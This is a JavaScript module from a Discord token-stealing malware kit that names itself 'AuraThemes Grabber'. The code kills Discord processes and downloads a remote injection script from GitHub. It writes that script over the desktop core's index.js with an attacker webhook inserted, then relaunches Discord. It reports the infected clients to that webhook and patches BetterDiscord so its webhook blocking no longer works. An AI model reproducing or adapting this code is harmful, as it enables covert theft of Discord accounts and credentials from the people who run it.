
const Injection = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js";

const fs = require("fs");
const path = require("path");
const glob = require("glob");
const process = require("process");
const { exec, execSync, spawn } = require("child_process");
const { decode_B64 } = require("./../../utils/functions/functions.js");
const { filter_processes } = require("./../core/core.js");
const { instance } = require("./../../utils/axios/request.js");

const local = process.env.localappdata;

const inject_path = [];

let infected_discord = [];

const buffer_replace = (buf, a, b) => {
  try {
    if (!Buffer.isBuffer(buf))
      buf = Buffer(buf);

    let idx = buf.indexOf(a);
    if (idx === -1)
      return buf;

    if (!Buffer.isBuffer(b))
      b = Buffer(b);

    let before = buf.slice(0, idx),
      after = replace(buf.slice(idx + a.length), a, b);

    return Buffer.concat(
      [
        before,
        b,
        after
      ], idx + b.length + after.length
    );
  } catch (e) {
    console.error(e);
  }
};

const better_broke = async () => {
  try {
    let broke = path.join(local, "betterdiscord/data/betterdiscord.asar");
    if (fs.existsSync(broke))
      await fs.promises.writeFile(
        broke, buffer_replace(await fs.promises.readFile(broke), "api/webhooks", "aurathemes")
      );
  } catch (e) {
    console.error(e);
  }
};

const discord_injected = async (res, webhook) => {
  if (res !== "true") return;

  const filter = await filter_processes("discord");

  let replaced_inject;

  try {
    if (filter.length > 0) {
      try {
        filter.forEach((proc) => process.kill(proc.pid));
      } catch (e) {
      }
    }

    const discord_folders = glob.sync(`${local}/*cord*`);

    for (let i = 0; i < discord_folders.length; i++) {
      const discord_folder = discord_folders[i];
      const apps = glob.sync(`${discord_folder}/app-*/`);

      if (apps.length < 1) return;
      //if (path.basename(discord_folder) == "Discord") {}

      for (let x = 0; x < apps.length; x++) {
        const app = apps[x];
        const desktop_cores = glob.sync(`${app}/modules/discord_desktop_core-*`);

        inject_path.push(...desktop_cores);
      }
    }

    for (let i = 0; i < inject_path.length; i++) {
      const desktop_path = inject_path[i];
      const injection = (await instance.get(Injection)).data;

      replaced_inject = injection.replace("%WEB" + "HOOK%", webhook[0]);

      try {
        await fs.writeFileSync(path.join(`${desktop_path}/discord_desktop_core/index.js`), `${replaced_inject}`, "utf-8");

        const first_directory = glob.sync(`${desktop_path}/discord_d*`)[0];

        if (!fs.existsSync(`${first_directory}/aurathemes`)) await fs.mkdirSync(`${first_directory}/aurathemes`);

        setTimeout(async () => {
          try {
            if (desktop_path) {
              const discord_folder = path.join(desktop_path, "..", "..", "..");
              const build_bat_path = path.join(desktop_path, "..", "..", `${path.basename(discord_folder)}.exe`);

              const options = {
                cwd: path.join(desktop_path, "..", ".."),
                stdio: "inherit",
              };

              spawn(build_bat_path, [], options);
            }
          } catch (e) {
            console.log(e)
          }
        }, 12000);

        inject_path.forEach((path) => {
          let match = path.match(/Local\/(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\//i);
          let name = match ? match[1] : "Not Found";
          infected_discord.push(`\`${name}\``);
        });

        infected_discord = infected_discord.length > 0 ? infected_discord.join(", ") : "❌";

        await instance({
          "url": webhook[0],
          "method": "POST",
          "data": {
            "username": 'AuraThemes Grabber - Injection',
            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
            "embeds": [{
              "title": 'Discord(s) injected(s)',
              "color": "12740607",
              "description": infected_discord,
              "timestamp": new Date(),
              "footer": {
                "text": decode_B64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
                "icon_url": 'https://i.imgur.com/yVnOSeS.gif'
              }
            }]
          }
        });
      } catch (err) {
        console.log(err)
      }
    }
  } catch (err) {
    console.log(err)
  }
  await better_broke();
};

module.exports = {
  inject_path,
  discord_injected
}
